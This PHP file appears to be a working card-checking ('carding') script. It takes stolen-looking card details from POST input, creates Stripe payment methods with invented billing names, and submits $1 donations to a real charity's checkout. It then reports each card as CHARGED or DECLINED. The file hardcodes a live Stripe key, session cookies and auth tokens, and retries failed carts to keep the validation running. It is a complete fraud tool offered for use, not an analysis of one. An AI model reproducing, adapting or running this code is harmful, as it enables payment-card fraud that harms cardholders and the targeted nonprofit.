<?php
// Start session for user authentication
session_start([
    'cookie_secure' => isset($_SERVER['HTTPS']),
    'cookie_httponly' => true,
    'use_strict_mode' => true,
]);

// Enable error logging
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/../logs/error.log');

// Include API key validation
require_once __DIR__ . '/validkey.php';
validateApiKey();

// Validate session for non-admin users
if (!isset($_SESSION['admin_authenticated']) || $_SESSION['admin_authenticated'] !== true) {
    if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
        error_log("Unauthorized access to stripe1$.php: Invalid session");
        http_response_code(401);
        echo json_encode(['status' => 'ERROR', 'message' => 'Unauthorized access']);
        exit;
    }
}

// Set content type to JSON
header('Content-Type: application/json');

// Get card details from POST request
$cardNumber = $_POST['card']['number'] ?? '';
$expMonth = $_POST['card']['exp_month'] ?? '';
$expYear = $_POST['card']['exp_year'] ?? '';
$cvc = $_POST['card']['cvc'] ?? '';

// Validate card details
if (empty($cardNumber) || empty($expMonth) || empty($expYear) || empty($cvc)) {
    echo json_encode(['status' => 'DECLINED', 'message' => 'Missing card details']);
    exit;
}

// Format year to 4 digits if needed
if (strlen($expYear) == 2) {
    $expYear = '20' . $expYear;
}

// Function to fetch a new cart token
function fetchCartToken() {
    $cartHeaders = [
        'authority: www.onamissionkc.org',
        'accept: application/json',
        'accept-encoding: gzip, deflate, br, zstd',
        'accept-language: en-US,en;q=0.9',
        'content-type: application/json',
        'cookie: crumb=BYRbHlJxSO4PZjU2MDU5YzlmYjc1MWZjNjkxY2M0NTIwNDdkNmUx; CART=tJR2kxhb_HZMnBeUPbTBQ32JZnpEv7UhNOuyOOVe; hasCart=true; __stripe_mid=fc26ede9-6f69-4fd8-b4f7-386dae9c5244177313; ss_cvr=63714000-1d58-4121-806c-904836745ca5|1761152654269|1761152654269|1761154790175|2; ss_cvt=1761154790175; __stripe_sid=6160dc1b-41b8-44ca-8ca2-0d290f1b1bd56b2330; SiteUserSecureAuthToken=MXw5ZmFkYjU5Ny05ODA0LTRhN2ItOGVlNy00ZGVkNDk1MjMyOGZ8UTlneXVXQ2xUanlULWl1U2sxTmdaTHBpZ3U4QnloYkItRDIxQnA4bFZXYVlNSlNwNXlVaHhOSVYxSy1Kd0ZzbQ; SiteUserInfo=%7B%22authenticated%22%3Atrue%2C%22lastAuthenticatedOn%22%3A%222025-10-22T18%3A06%3A23.771Z%22%2C%22siteUserId%22%3A%2268f90ebd9b1f1d028af94072%22%2C%22firstName%22%3A%22Rocky%22%7D; siteUserCrumb=Y8IivSjWX4camqD0znkkk9qNeyZNI4YiENbz-_oda6FvZGKnqVefr68NMWci2RoIBVVWXDcii4C8RSjxNWdbLNssugrOcWCg57MhmMEUYxSY2NEp3-Jm3gcclnX6rJn0',
        'origin: https://www.onamissionkc.org',
        'priority: u=1, i',
        'referer: https://www.onamissionkc.org/donate-now',
        'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile: ?1',
        'sec-ch-ua-model: "Nexus 5"',
        'sec-ch-ua-platform: "Android"',
        'sec-ch-ua-platform-version: "6.0"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
    ];

    $cartData = json_encode([
        'amount' => [
            'value' => 100,
            'currencyCode' => 'USD',
        ],
        'donationFrequency' => 'ONE_TIME',
        'feeAmount' => null,
    ]);

    $ch = curl_init('https://www.onamissionkc.org/api/v1/fund-service/websites/62fc11be71fa7a1da8ed62f8/donations/funds/6acfdbc6-2deb-42a5-bdf2-390f9ac5bc7b');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $cartHeaders);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $cartData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $cartResponse = curl_exec($ch);
    $cartResult = json_decode($cartResponse, true);
    $cartHttpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($cartHttpCode != 200 || !isset($cartResult['redirectUrlPath'])) {
        $errorMsg = $cartResult['error']['message'] ?? 'Failed to create new cart';
        error_log("Failed to fetch new cart token: $errorMsg");
        echo json_encode(['status' => 'ERROR', 'message' => 'Unable to create new cart']);
        exit;
    }

    // Extract cart token from redirectUrlPath
    preg_match('/cartToken=([^&]+)/', $cartResult['redirectUrlPath'], $matches);
    if (!isset($matches[1])) {
        error_log("Failed to extract cart token from redirectUrlPath");
        echo json_encode(['status' => 'ERROR', 'message' => 'Unable to extract cart token']);
        exit;
    }

    return $matches[1];
}

// First API call to create payment method
$headers = [
    'authority: api.stripe.com',
    'accept: application/json',
    'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
];

$data = 'billing_details[address][city]=Oakford&billing_details[address][country]=US&billing_details[address][line1]=Siles+Avenue&billing_details[address][line2]=&billing_details[address][postal_code]=19053&billing_details[address][state]=PA&billing_details[name]=Geroge+Washintonne&billing_details[email]=grogeh%40gmail.com&type=card&card[number]=' . $cardNumber . '&card[cvc]=' . $cvc . '&card[exp_year]=' . $expYear . '&card[exp_month]=' . $expMonth . '&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F5445b56991%3B+stripe-js-v3%2F5445b56991%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.onamissionkc.org&time_on_page=145592&client_attribution_metadata[client_session_id]=22e7d0ec-db3e-4724-98d2-a1985fc4472a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=7904f40e-9588-48b2-bc6b-fb88e0ef71d5&guid=18f2ab46-3a90-48da-9a6e-2db7d67a3b1de3eadd&muid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48&sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67&key=pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e&_stripe_account=acct_1LwocDFHMGxIu0Ep';

$ch = curl_init('https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
$response = curl_exec($ch);
$apx = json_decode($response, true);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode != 200 || !isset($apx['id'])) {
    $errorMsg = $apx['error']['message'] ?? 'Unknown error';
    echo json_encode(['status' => 'DECLINED', 'message' => $errorMsg]);
    exit;
}

$pid = $apx["id"];

// Function to make merchant API call
function makeMerchantApiCall($cartToken, $pid) {
    $cookies = 'crumb=BYRbHlJxSO4PZjU2MDU5YzlmYjc1MWZjNjkxY2M0NTIwNDdkNmUx; CART=tJR2kxhb_HZMnBeUPbTBQ32JZnpEv7UhNOuyOOVe; hasCart=true; __stripe_mid=fc26ede9-6f69-4fd8-b4f7-386dae9c5244177313; ss_cvr=63714000-1d58-4121-806c-904836745ca5|1761152654269|1761152654269|1761154790175|2; ss_cvt=1761154790175; __stripe_sid=6160dc1b-41b8-44ca-8ca2-0d290f1b1bd56b2330; SiteUserSecureAuthToken=MXw5ZmFkYjU5Ny05ODA0LTRhN2ItOGVlNy00ZGVkNDk1MjMyOGZ8UTlneXVXQ2xUanlULWl1U2sxTmdaTHBpZ3U4QnloYkItRDIxQnA4bFZXYVlNSlNwNXlVaHhOSVYxSy1Kd0ZzbQ; SiteUserInfo=%7B%22authenticated%22%3Atrue%2C%22lastAuthenticatedOn%22%3A%222025-10-22T18%3A06%3A23.771Z%22%2C%22siteUserId%22%3A%2268f90ebd9b1f1d028af94072%22%2C%22firstName%22%3A%22Rocky%22%7D; siteUserCrumb=Y8IivSjWX4camqD0znkkk9qNeyZNI4YiENbz-_oda6FvZGKnqVefr68NMWci2RoIBVVWXDcii4C8RSjxNWdbLNssugrOcWCg57MhmMEUYxSY2NEp3-Jm3gcclnX6rJn0';

    $headers = [
        'authority: www.onamissionkc.org',
        'accept: application/json, text/plain, */*',
        'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
        'content-type: application/json',
        'origin: https://www.onamissionkc.org',
        'referer: https://www.onamissionkc.org/checkout?cartToken=' . $cartToken,
        'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile: ?1',
        'sec-ch-ua-platform: "Android"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'x-csrf-token: BYRbHlJxSO4PZjU2MDU5YzlmYjc1MWZjNjkxY2M0NTIwNDdkNmUx',
    ];

    $jsonData = json_encode([
        'email' => 'grogeh@gmail.com',
        'subscribeToList' => false,
        'shippingAddress' => [
            'id' => '',
            'firstName' => '',
            'lastName' => '',
            'line1' => '',
            'line2' => '',
            'city' => '',
            'region' => 'NY',
            'postalCode' => '',
            'country' => '',
            'phoneNumber' => '',
        ],
        'createNewUser' => false,
        'newUserPassword' => null,
        'saveShippingAddress' => false,
        'makeDefaultShippingAddress' => false,
        'customFormData' => null,
        'shippingAddressId' => null,
        'proposedAmountDue' => [
            'decimalValue' => '1',
            'currencyCode' => 'USD',
        ],
        'cartToken' => $cartToken,
        'paymentToken' => [
            'stripePaymentTokenType' => 'PAYMENT_METHOD_ID',
            'token' => $pid,
            'type' => 'STRIPE',
        ],
        'billToShippingAddress' => false,
        'billingAddress' => [
            'id' => '',
            'firstName' => 'Davide',
            'lastName' => 'Washintonne',
            'line1' => 'Siles Avenue',
            'line2' => '',
            'city' => 'Oakford',
            'region' => 'PA',
            'postalCode' => '19053',
            'country' => 'US',
            'phoneNumber' => '+1361643646',
        ],
        'savePaymentInfo' => false,
        'makeDefaultPayment' => false,
        'paymentCardId' => null,
        'universalPaymentElementEnabled' => true,
    ]);

    $ch = curl_init('https://www.onamissionkc.org/api/2/commerce/orders');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
    curl_setopt($ch, CURLOPT_COOKIE, $cookies);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $response = curl_exec($ch);
    $result = json_decode($response, true);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return ['response' => $result, 'httpCode' => $httpCode];
}

// Initial cart token fetch
$cartToken = fetchCartToken();

// Attempt merchant API call with retry on CART_ALREADY_PURCHASED or CART_MISSING
$maxRetries = 3;
$retryCount = 0;

while ($retryCount < $maxRetries) {
    $merchantResult = makeMerchantApiCall($cartToken, $pid);
    $apx1 = $merchantResult['response'];
    $httpCode = $merchantResult['httpCode'];

    if ($httpCode == 200 && !isset($apx1['failureType'])) {
        // Success
        echo json_encode([
            'status' => 'CHARGED',
            'message' => 'Charged $1 successfully',
            'response' => 'CHARGED'
        ]);
        exit;
    }

    // Check for CART_ALREADY_PURCHASED or CART_MISSING
    if (isset($apx1['failureType']) && in_array($apx1['failureType'], ['CART_ALREADY_PURCHASED', 'CART_MISSING'])) {
        error_log("Cart error: {$apx1['failureType']}, retrying with new cart token");
        $cartToken = fetchCartToken();
        $retryCount++;
        continue;
    }

    // Other failures
    $errorMsg = $apx1['failureType'] ?? 'Unknown error';
    echo json_encode([
        'status' => 'DECLINED',
        'message' => 'Your card was declined',
        'response' => $errorMsg
    ]);
    exit;
}

// Max retries reached
error_log("Max retries reached for cart token errors");
echo json_encode([
    'status' => 'ERROR',
    'message' => 'Unable to process payment due to persistent cart errors',
    'response' => 'MAX_RETRIES_EXCEEDED'
]);
?>
